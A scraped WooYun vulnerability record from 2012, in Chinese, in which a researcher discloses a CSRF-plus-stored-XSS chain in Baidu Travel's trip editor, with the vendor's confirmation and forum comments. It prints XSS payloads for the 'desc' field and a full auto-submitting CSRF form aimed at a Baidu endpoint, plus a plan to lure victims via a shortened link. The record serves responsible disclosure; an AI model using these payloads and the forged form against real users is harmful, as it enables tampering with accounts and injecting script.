{"id": 17720, "wybug_id": "wooyun-2012-010148", "wybug_title": "用CSRF利用百度旅游中的YY型XSS", "wybug_corp": "百度", "wybug_author": "P1n9y_fly", "wybug_date": "2012-07-25 21:54", "wybug_open_date": "2012-09-08 21:54", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-08：\t细节向公众公开  简要描述： 用CSRF利用YY型XSS一处……囧…… 详细说明：  是在旅游中 旅程 的编辑中YY的作为一名新的web安全爱好者新手，看书之余，每天四处逛网站复制粘贴是必备的，发现有很多的XSS都是只能XSS自己，感觉很郁闷比如下面这一个百度旅游的。\n\n在创建新的旅程的时候，将“旅程描述”这一栏设为\"/><IFRAME SRC=http://www.qq.com onload=alert(1898)></IFRAME>后，到浏览页面下查看发现已经被过滤了\n\n 但是在点击编辑之后，成功的弹出了如上窗口，查看源代码发现是desc木有过滤，导致出现了这个YY型的XSS。\n\n如何利用这个YY型XSS呢。在编辑提交之后我用Fiddler抓到了这样一个包：\n\n木有token，除了最后一个是什么意思不明白其他还好说，我们到浏览页面源代码中搜索最下面的两个值，发现一个是trnid的值一个是sid的值，都是可以查到的，那么我就构建了一个表单：\n<head><meta charset=\"GB2312\"/><title>test</title></head><form method=\"post\" action=\"http://lvyou.baidu.com/footprint/trip/post/editsave\" target=\"_self\">\t<input name=\"start_time\" value='1999-03-01'>\t<input name=\"time\" value=\"102\">\t<input name=\"time_unit\" value=\"d\">\t<input name=\"departure\" value=\"\">\t<input name=\"departure_sid\" value=\"1fdbf740851f3e07d8d23ff7\">\t<input name=\"desc\" value=\" \">\t<input name=\"zoom\" value=\"5\">\t<input name=\"trid\" value=\"af3142e1dfcadf25f3208251\">\t<input name=\"node_array[]\" value=\"68be7ae3b9d414ff762fdd82,e1b1b2be2306a40f9b9d32db\">\t<input name=\"submit\" type=\"submit\" value=\"submit\" onclick=submit()/></form>\n将desc的值设为\"/><script/defer>alert(1898)</script>并修改其他值，点击提交之后发现旅程描述变了。\n\n然后点开编辑发现成功弹窗\n\n我们试想一下，我们找到一篇旅程，查看到他的各项参数，比如trid，nid等等，然后构造一个POST表单放入sinaapp中，设置成短网址后给这个人发一条评论，他点了之后自动提交表单，他的旅程描述就被改为了恶意代码，之后他发现不对，点击编辑改回去，恶意代码就执行了。   漏洞证明：  这个不好证明。。其实很好自测的吧。。http://lvyou.baidu.com/user/trip/66a1950cff3325d7323ccbfb   修复方案：  1.弄掉CSRF2.弄掉YY型XSS。。。   版权声明：转载请注明来源 P1n9y_fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2012-07-26 10:21 厂商回复： 思路不错，感谢你对百度安全的关注，我们尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-25 22:02 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  yy。。    \n     2012-07-25 22:06 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  rookit?    \n     2012-07-25 22:15 |    \t\tFlyR4nk \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  @水滴 怎么个情况。。。。    \n     2012-07-25 22:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @FlyR4nk 这个思路真有点儿意思    \n     2012-07-25 22:24 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @FlyR4nk 我看不见啊啊啊    \n     2012-07-25 22:24 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @xsser 求    \n     2012-07-25 22:25 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 哈，思路有意思的，重点关注～～     \n     2012-07-25 22:25 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @gainover 。。。。。。    \n     2012-07-25 22:41 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 = = 别。。。。。 了，我猜，是csrf+xss rookit，然后加上某些某些其他东西吧。。    \n     2012-07-26 10:24 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  @P1n9y_fly 妖姐，你赢了    \n     2012-07-26 10:33 |    \t\tP1n9y_fly \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:11        | ضصششسسزرذخكللممنيئؤؤ...)\t\t \n  @goderci 不要暴露我的外号好么T-T。。。完了。。。    \n     2012-07-26 10:47 |    \t\tFlyR4nk \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  @xsser 赞思路，等待公开。    \n     2012-07-26 10:51 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @goderci 难道是妹子～～    \n     2012-07-26 10:58 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @goderci 漏洞数28，我不小心看成了2B    \n     2012-07-26 10:59 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  @一刀终情 fu_k！那一会我再发个漏洞。    \n     2012-07-26 11:00 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  @gainover 必须是    \n     2012-07-26 11:10 |    \t\tP1n9y_fly \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:11        | ضصششسسزرذخكللممنيئؤؤ...)\t\t \n  @goderci @gainover 纯爷们- -之前玩游戏玩了个女号一直被他们叫道现在- -    \n     2012-07-26 13:12 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  我是来围观妖姐的    \n     2012-08-15 15:20 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  确实有意思~    \n     2012-08-25 10:58 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  好牛..    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}